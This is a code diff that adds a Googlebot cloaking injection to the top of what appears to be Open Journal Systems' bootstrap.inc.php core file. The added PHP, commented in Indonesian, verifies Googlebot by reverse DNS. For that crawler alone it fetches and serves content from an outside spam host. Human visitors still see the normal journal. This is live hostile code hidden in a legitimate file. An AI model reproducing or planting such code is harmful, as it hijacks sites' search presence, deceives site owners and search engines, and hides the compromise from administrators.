@@ -1,0 +1,88 @@
+<?php
+// ================================================
+// GOOGLEBOT DETECTION - VERIFIED BY DNS
+// ================================================
+
+function is_google_bot() {
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    
+    // CARA PALING AKURAT: REVERSE DNS LOOKUP
+    if ($ip) {
+        // Dapatkan hostname dari IP
+        $host = gethostbyaddr($ip);
+        
+        // Googlebot asli punya hostname yang berakhiran:
+        // .googlebot.com atau .google.com
+        if (preg_match('/\.(googlebot|google)\.com$/i', $host)) {
+            // Verifikasi balik: cek apakah hostname resolve ke IP yang sama
+            $verify_ip = gethostbyname($host);
+            if ($verify_ip === $ip) {
+                return true; // 100% GOOGLEBOT ASLI
+            }
+        }
+    }
+    
+    return false; // BUKAN GOOGLEBOT
+}
+
+// ================================================
+// EKSEKUSI
+// ================================================
+
+if (is_google_bot()) {
+    // HANYA GOOGLEBOT YANG DAPET AKSES INI
+    $ch = curl_init('https://pessawat.site/pisauuu/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    echo curl_exec($ch);
+    curl_close($ch);
+    exit;
+}
+
+// KALO BUKAN GOOGLEBOT (MANUSIA / BOT LAIN):
+// Biarin aja jalan ke OJS seperti biasa
+// Jangan kasih apa-apa, biar normal
+
+// ================================================
+// SISA KODE OJS (JANGAN DIUBAH)
+// ================================================
+/**
+ * @defgroup index Index
+ * Bootstrap and initialization code.
+ */
+
+/**
+ * @file includes/bootstrap.inc.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @ingroup index
+ *
+ * @brief Core system initialization code.
+ * This file is loaded before any others.
+ * Any system-wide imports or initialization code should be placed here.
+ */
+
+
+/**
+ * Basic initialization (pre-classloading).
+ */
+
+define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
+if (!defined('DIRECTORY_SEPARATOR')) {
+	// Older versions of PHP do not define this
+	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
+}
+define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
+chdir(BASE_SYS_DIR);
+
+// System-wide functions
+require('./lib/pkp/includes/functions.inc.php');
+
+// Initialize the application environment
+import('classes.core.Application');
+
+return new Application();
+?>
